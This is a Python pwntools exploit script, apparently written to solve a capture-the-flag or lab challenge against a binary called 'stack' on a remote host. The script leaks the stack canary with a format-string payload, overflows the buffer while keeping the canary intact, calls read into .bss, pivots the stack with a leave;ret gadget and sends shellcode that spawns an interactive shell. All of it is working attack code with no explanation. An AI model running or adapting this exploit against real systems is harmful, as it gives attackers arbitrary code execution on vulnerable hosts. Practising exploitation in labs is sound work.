from pwn import *
context.log_level = "debug"
#context.arch = ""
io = remote("192.168.250.223",12340)
#io = process("./stack")
elf = ELF("./stack")
#input()
pause()
io.recv()
payload1 = b"%7$p"
io.sendline(payload1)

io.recvuntil("hello!")
canary = int(io.recv(),16)
print(canary)
bss = 0x804A060
bss4 = bss + 0x4
bss8 = bss + 0x8
read_plt = elf.plt['read']
print("read;",read_plt)
read_got = elf.got['read']
lev_ret = 0x08048568
pause()
payload2 = b"A"*24+p32(canary)+b"A"*8+p32(bss)+p32(read_plt)+p32(lev_ret) +p32(0)+p32(bss)+p32(80)
pause()
#gdb.attach(io)
#pause()
print(payload2)

io.send(payload2)

bin_sh = p32(bss4) + p32(bss8) + asm(shellcraft.sh())

io.send(bin_sh)
io.interactive()
